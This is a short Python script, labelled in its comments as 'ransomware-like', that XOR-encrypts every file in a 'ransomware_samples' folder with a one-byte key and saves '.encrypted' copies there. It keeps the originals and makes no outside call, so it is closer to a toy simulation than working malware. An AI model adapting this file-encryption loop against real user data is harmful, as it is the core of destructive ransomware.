import os

# Create a directory to store ransomware-like files
if not os.path.exists('ransomware_samples'):
    os.makedirs('ransomware_samples')

# Define a function to encrypt files
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = bytearray(f.read())
    
    for i in range(len(data)):
        data[i] ^= key
        
    encrypted_file_path = os.path.join('ransomware_samples', os.path.basename(file_path) + '.encrypted')
    with open(encrypted_file_path, 'wb') as f:
        f.write(data)

# Encrypt all files in a directory
def encrypt_files_in_directory(directory, key):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

# Encrypt files in the ransomware_samples directory
key = 0xFF  # Encryption key (you can use any byte value)
encrypt_files_in_directory('ransomware_samples', key)

print("Files encrypted successfully.")
